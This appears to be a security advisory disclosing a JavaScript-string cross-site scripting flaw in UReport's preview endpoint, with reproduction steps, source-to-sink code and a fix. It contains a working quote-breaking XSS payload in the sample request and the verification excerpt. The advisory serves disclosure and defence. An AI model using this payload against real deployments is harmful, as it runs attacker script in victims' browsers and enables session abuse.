# UReport customParameters JavaScript-string XSS

## Summary

Non-reserved preview parameters are concatenated into customParameters and emitted inside an inline JavaScript string without JavaScript-string encoding.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated attacker; a renderable report; victim opens the crafted preview URL.

Verified flow: `arbitrary preview query parameter -> buildCustomParameters() -> Velocity customParameters -> inline submitSearchForm string`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Prepare or select any report that reaches the successful preview template branch.
2. Add a non-reserved query parameter containing a quote-breaking JavaScript payload.
3. Open the URL and inspect the inline ready handler where the payload escapes submitSearchForm.

Sanitized request shape used during verification:

```http
GET <BASE_URL>/blade-report/ureport/preview
blade-auth: bearer <JWT>

?_u=blade-<RENDERABLE_REPORT>&p=URLENCODE('");}});self[`al`+`ert`](`gt48261022c3c`);(function(){function f(){//')
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt48261022c3a` | raw JS-string breakout | **PASS** |
| 2 | `gt48261022c3b` | raw JS-string breakout | **PASS** |
| 3 | `gt48261022c3c` | raw JS-string breakout | **PASS** |

```text
Saved run-3 script excerpt:
submitSearchForm("...","p=");}});self[`al`+`ert`](`gt48261022c3c`);(function(){function f(){//");

The payload balances the remaining template braces and executes at page load.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
HtmlPreviewServletAction.java:315-336
private String buildCustomParameters(HttpServletRequest req) {
    // appends every non-reserved name=value pair
    sb.append(name).append("=").append(value);
    return sb.toString();
}

ureport-html/html-preview.html:123
submitSearchForm("${file}","${customParameters}");
```

Root cause: HTML filtering is used for data that later enters a JavaScript string. Quotes and JavaScript syntax are not encoded for that context.

## Recommended remediation

Serialize parameters with a JSON encoder or emit them through a non-executable data element; never interpolate raw query data into inline JavaScript.

## References

- Official source: https://github.com/youseries/ureport/blob/master/ureport2-console/src/main/java/com/bstek/ureport/console/html/HtmlPreviewServletAction.java

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-02 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-02/01-reproduction-v2.png)

### Three-run success proof

![CAN-02 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-02/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-02 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-02/03-source-sink-v2.png)
